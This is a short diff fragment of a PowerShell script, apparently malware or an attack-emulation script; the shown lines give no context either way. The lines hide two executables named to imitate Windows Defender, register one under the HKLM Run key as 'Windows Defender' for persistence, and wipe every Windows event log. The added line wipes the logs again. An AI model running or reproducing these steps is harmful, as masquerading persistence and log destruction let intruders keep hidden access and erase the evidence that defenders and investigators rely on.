@@ -21,3 +21,4 @@ Get-Item C:\Users\Public\MSASC.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'
 Get-Item C:\Users\Public\MSASCuiL.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'}
 New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name "Windows Defender" -Value "C:\Users\Public\MSASCuiL.exe"
 wevtutil w el | Foreach-Object {wevtutil cl "$_"}
+Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
